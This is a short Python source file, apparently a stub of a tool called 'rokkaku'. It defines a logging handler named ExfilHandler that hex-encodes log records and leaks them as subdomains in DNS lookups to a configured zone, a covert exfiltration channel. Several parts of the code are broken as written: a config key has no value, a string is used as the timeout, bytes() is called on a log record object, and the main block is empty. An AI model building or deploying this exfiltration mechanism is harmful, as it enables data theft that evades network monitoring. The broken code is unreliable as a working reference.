# -*- coding: utf-8 -*-

import binascii
import logging.handlers
import socket

try:
    import ConfigParser as configparser
except ImportError:
    import configparser

try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

config = """
[rokkaku]
timeout = 1
dns_zone
"""

sb = StringIO(config)
config = configparser.ConfigParser(allow_no_value=False)
config.readfp(sb)

socket.setdefaulttimeout(config['rokkaku']['timeout'])


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    def emit(self, record):
        self.buffer.append(record)
        if self.shouldFlush(record):
            self.flush()
            payload = binascii.hexlify(bytes(record, 'utf8'))
            socket.gethostbyname(
                '{0}.{1}'.format(
                    payload,
                    config['rokkaku']['dns_zone']))
            self.target.stream = StringIO()


if __name__ == '__main__':
    pass
